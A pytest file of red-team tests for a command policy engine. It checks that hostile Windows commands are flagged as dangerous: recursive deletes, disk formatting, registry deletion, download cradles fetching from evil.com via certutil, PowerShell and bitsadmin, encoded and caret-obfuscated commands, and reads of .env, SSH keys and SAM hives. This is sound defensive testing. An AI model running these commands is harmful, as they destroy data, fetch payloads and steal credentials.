"""
Windows-specific command policy security tests (Red-Team adversarial cases).
"""
from pathlib import Path
import pytest

from brahmastra.domain.patch.command_policy import CommandPolicyEngine
from brahmastra.domain.patch.models import CommandRiskLevel


@pytest.mark.parametrize(
    "cmd",
    [
        "del /s /q C:\\*",
        "erase /f /q *.py",
        "rmdir /s /q build",
        "rd /s /q C:\\Windows",
        "format C: /fs:ntfs /q",
        "reg delete HKLM\\Software /f",
        "reg add HKLM\\Software /v Bad /d 1",
        "certutil -urlcache -split -f http://evil.com/payload.exe",
        "certutil -decode payload.b64 payload.dll",
        "powershell -EncodedCommand JABhAD0...==",
        "powershell -enc AAAA",
        "pwsh -Command \"Invoke-WebRequest http://evil.com\"",
        "powershell -c \"(New-Object Net.WebClient).DownloadString('http://evil.com')\"",
        "bitsadmin /transfer eviljob http://evil.com/bad.exe C:\\bad.exe",
    ],
)
def test_windows_destructive_commands_flagged_dangerous(cmd):
    """Verify destructive Windows commands and download cradles are classified DANGEROUS."""
    action = CommandPolicyEngine.evaluate(cmd, working_dir=Path.cwd())
    assert action.risk_level == CommandRiskLevel.DANGEROUS
    assert action.requires_explicit_override is True


@pytest.mark.parametrize(
    "cmd",
    [
        "dir %TEMP%",
        "echo %PATH%",
        "type %USERPROFILE%\\.ssh\\id_rsa",
        "dir %APPDATA%",
    ],
)
def test_windows_env_var_expansion_disqualified_from_safe_read(cmd):
    """Verify Windows %VAR% environment expansions are disqualified from SAFE_READ."""
    action = CommandPolicyEngine.evaluate(cmd, working_dir=Path.cwd())
    assert action.risk_level != CommandRiskLevel.SAFE_READ


@pytest.mark.parametrize(
    "cmd",
    [
        "t^y^p^e .env",
        "c^a^t .env",
        "d^e^l file.txt",
    ],
)
def test_windows_caret_escape_flagged(cmd):
    """Verify Windows caret ^ obfuscation does not evade security policy."""
    action = CommandPolicyEngine.evaluate(cmd, working_dir=Path.cwd())
    assert action.risk_level != CommandRiskLevel.SAFE_READ


@pytest.mark.parametrize(
    "cmd",
    [
        "type .env",
        "type subdir\\.env",
        "type subdir\\..\\.env",
        "type C:\\Windows\\System32\\config\\SAM",
        "type C:\\Windows\\System32\\config\\SYSTEM",
        "more .env",
    ],
)
def test_windows_sensitive_file_reads_flagged_dangerous(cmd, tmp_path):
    """Verify Windows type/more against sensitive files are flagged DANGEROUS."""
    action = CommandPolicyEngine.evaluate(cmd, working_dir=tmp_path)
    assert action.risk_level == CommandRiskLevel.DANGEROUS
    assert action.requires_explicit_override is True


@pytest.mark.parametrize(
    "cmd",
    [
        "dir",
        "where python",
        "where.exe pytest",
    ],
)
def test_windows_safe_commands_recognized(cmd):
    """Verify benign Windows inspection commands can be recognized as SAFE_READ."""
    action = CommandPolicyEngine.evaluate(cmd, working_dir=Path.cwd())
    assert action.risk_level == CommandRiskLevel.SAFE_READ
